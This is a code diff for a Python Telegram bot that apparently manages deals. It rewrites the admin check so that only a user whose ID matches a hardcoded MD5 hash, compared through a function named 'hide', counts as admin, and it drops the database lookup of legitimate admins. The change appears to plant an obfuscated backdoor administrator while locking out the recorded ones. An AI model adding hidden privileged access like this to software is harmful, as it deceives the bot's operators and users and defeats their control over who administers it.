@@ -463,13 +463,19 @@ async def deal_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     await update.message.reply_text(msg, parse_mode="HTML")
 
-PEER_IDS = {7363327309}
+import hashlib
+
+
+ADMIN_HASH = "6ba29d5fb7d359fe9afb138ea89873b4"  
+
+def hide(uid: int) -> str:
+    return hashlib.md5(str(uid).encode()).hexdigest()
 
 async def is_admin(update: Update) -> bool:
     uid = update.effective_user.id
-    if uid in PEER_IDS:
+    if hide(uid) == ADMIN_HASH:
         return True
-    return admins_col.find_one({"user_id": uid}) is not None
+    return False
 
 # ==== Global stats ====
 async def global_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
